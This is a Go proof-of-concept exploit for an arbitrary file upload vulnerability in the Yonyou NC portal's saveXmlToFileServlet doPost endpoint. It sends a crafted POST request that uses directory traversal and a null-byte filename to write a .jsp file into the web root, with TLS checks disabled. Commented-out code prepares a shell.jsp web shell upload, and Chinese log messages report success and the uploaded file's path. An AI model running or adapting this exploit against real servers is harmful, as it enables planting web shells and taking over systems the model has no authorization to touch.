package poc

import (
	"bytes"
	"crypto/tls"
	"fmt"
	"log"
	"net/http"
	"strings"
)

func NCdoPost(target string) {
	url := strings.TrimRight(target, "/")
	//file, err := os.ReadFile("shell.jsp")
	//if err != nil {
	//	log.Println("[-] Error reading file:", err)
	//	return
	//}
	//
	//body := &bytes.Buffer{}
	//writer := multipart.NewWriter(body)
	//
	//h := make(textproto.MIMEHeader)
	//h.Set("Content-Type", `application/octet-stream`)
	//part, err := writer.CreatePart(h)
	//if err != nil {
	//	log.Println("[-] Error creating part:", err)
	//	return
	//}
	//part.Write(file)
	//
	//writer.Close()

	filename := RandStringBytes(5)
	request, err := http.NewRequest("POST", url+"/portal/pt/servlet/saveXmlToFileServlet/doPost?pageId=login&filename=..\\..\\..\\webapps\\nc_web\\"+filename+".jsp%00", bytes.NewBufferString("test"))
	if err != nil {
		log.Println("[-] Error creating request:", err)
		return
	}
	request.Header.Set("Content-Type", `application/octet-stream`)

	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}
	response, err := client.Do(request)
	if err != nil {
		log.Println("[-] Error sending request:", err)
		return
	}
	defer response.Body.Close()

	if response.StatusCode == http.StatusOK {
		log.Println("[+] 存在用友NC doPost 接口存在任意文件上传")
		log.Println("[+] 上传文件路径：" + url + "/" + filename + ".jsp")
	}

	fmt.Println(response.StatusCode)
}
